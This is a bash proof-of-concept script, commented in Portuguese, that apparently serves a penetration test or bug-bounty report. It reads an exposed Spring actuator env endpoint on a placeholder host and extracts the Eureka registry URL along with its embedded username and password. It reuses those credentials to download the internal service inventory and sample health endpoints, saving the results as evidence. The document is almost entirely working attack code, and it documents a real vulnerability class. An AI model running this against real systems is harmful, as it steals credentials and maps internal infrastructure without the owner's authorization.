#!/usr/bin/env bash
set -euo pipefail

BASE_URL="https://api.exemplo.com.br"
ENV_PATH="/api/management/env"

echo "[*] Baixando env de ${BASE_URL}${ENV_PATH} ..."
RAW_ENV="$(curl -sk "${BASE_URL}${ENV_PATH}")"

# 1) Extrair automaticamente a URL do Eureka (tenta jq; se não houver, usa grep/sed)
EUREKA_URL="$(
  if command -v jq >/dev/null 2>&1; then
    printf '%s' "$RAW_ENV" | jq -r '..|.EUREKA_CLIENT_SERVICE_URL_DEFAULTZONE? // empty' | head -n1
  fi
)"
if [ -z "${EUREKA_URL:-}" ]; then
  # fallback robusto para JSON com chaves/valores
  EUREKA_URL="$(printf '%s' "$RAW_ENV" \
    | grep -oE '"EUREKA_CLIENT_SERVICE_URL_DEFAULTZONE"\s*:\s*"[^"]+"' \
    | sed -E 's/.*"EUREKA_CLIENT_SERVICE_URL_DEFAULTZONE"\s*:\s*"([^"]+)".*/\1/' \
    | head -n1)"
fi

if [ -z "${EUREKA_URL:-}" ]; then
  echo "[!] Não foi possível localizar EUREKA_CLIENT_SERVICE_URL_DEFAULTZONE no /env"; exit 1
fi

echo "[*] EUREKA url encontrada: ${EUREKA_URL}"

# 2) Parsear protocolo, usuário, senha e host a partir da URL
PROTO="$(printf '%s' "$EUREKA_URL" | sed -E 's#^(https?)://.*#\1#')"
CREDS="$(printf '%s' "$EUREKA_URL" | sed -E 's#^https?://([^@]+)@.*#\1#')"
EUREKA_USER="${CREDS%%:*}"
EUREKA_PASS="${CREDS#*:}"
EUREKA_HOST="$(printf '%s' "$EUREKA_URL" | sed -E 's#^https?://[^@]+@([^/]+)/?.*#\1#')"
EUREKA_BASE="${PROTO}://${EUREKA_HOST}/eureka"

# 3) Criar pasta de evidências e evitar vazar senha no histórico
mkdir -p poc_eureka && cd poc_eureka
set +o history 2>/dev/null || true

echo "[*] Testando autenticação no Eureka ..."
curl -sk -u "${EUREKA_USER}:${EUREKA_PASS}" -I "${EUREKA_BASE}/apps" | tee 01_apps_headers.txt

echo "[*] Coletando inventário (JSON e XML) ..."
curl -sk -H 'Accept: application/json' -u "${EUREKA_USER}:${EUREKA_PASS}" \
  "${EUREKA_BASE}/apps" | tee 02_apps.json >/dev/null

curl -sk -u "${EUREKA_USER}:${EUREKA_PASS}" \
  "${EUREKA_BASE}/apps" | tee 02_apps.xml >/dev/null

echo "[*] Extraindo IPs/hosts/health para evidência ..."
if command -v jq >/dev/null 2>&1 && [ -s 02_apps.json ]; then
  jq -r '.applications.application[]
         | .name as $app
         | .instance[]
         | [$app, .hostName, .ipAddr, (.port|.["$"]), (.securePort|.["$"]), .statusPageUrl, .healthCheckUrl]
         | @tsv' 02_apps.json \
    | sort -u | tee 03_inventory_from_json.tsv >/dev/null
fi
grep -Eo '<ipAddr>[^<]+'       02_apps.xml | cut -d'>' -f2 | sort -u | tee 03_ips_from_xml.txt >/dev/null
grep -Eo '<hostName>[^<]+'     02_apps.xml | cut -d'>' -f2 | sort -u | tee 03_hosts_from_xml.txt >/dev/null
grep -Eo '<healthCheckUrl>[^<]+' 02_apps.xml | cut -d'>' -f2 | sort -u | tee 03_health_urls_from_xml.txt >/dev/null
grep -Eo '<statusPageUrl>[^<]+'  02_apps.xml | cut -d'>' -f2 | sort -u | tee 03_status_urls_from_xml.txt >/dev/null

echo "[*] Amostrando até 5 URLs de health (somente GET) ..."
: > 05_health_urls.txt
if command -v jq >/dev/null 2>&1 && [ -s 02_apps.json ]; then
  jq -r '.applications.application[].instance[].healthCheckUrl // empty' 02_apps.json \
    | sort -u | head -n 10 >> 05_health_urls.txt
fi
grep -Eo '<healthCheckUrl>[^<]+' 02_apps.xml | cut -d'>' -f2 | sort -u | head -n 10 >> 05_health_urls.txt

nl -ba 05_health_urls.txt | sed -n '1,5p' | while read -r N URL; do
  echo -e "\n==> [$N] ${URL}"
  curl -sk -m 5 "$URL" | head -c 800
  sleep 1
done | tee 05_health_checks_samples.txt >/dev/null

echo "[*] Gerando sumário ..."
{
  echo "=== Resumo PoC Eureka ==="
  date -Is
  echo "EUREKA_BASE: ${EUREKA_BASE}"
  echo "USER: ${EUREKA_USER}"
  echo "Arquivos:"
  ls -lh 01_* 02_* 03_* 05_* 2>/dev/null || true
  echo
  [ -f 03_ips_from_xml.txt ]   && echo "IPs (XML):   $(wc -l < 03_ips_from_xml.txt)"
  [ -f 03_hosts_from_xml.txt ] && echo "Hosts (XML): $(wc -l < 03_hosts_from_xml.txt)"
  [ -f 03_inventory_from_json.tsv ] && echo "Instâncias (linhas TSV): $(wc -l < 03_inventory_from_json.tsv)"
} | tee 06_summary.txt

echo "[*] (Opcional) Sanitizando credenciais nos artefatos ..."
for f in 02_apps.json 02_apps.xml 05_health_checks_samples.txt; do
  [ -f "$f" ] || continue
  sed -i -E 's#://([^:/@]+):([^@]+)@#://\1:********@#g' "$f"
done

echo "[✓] PoC concluída. Evidências em $(pwd)"
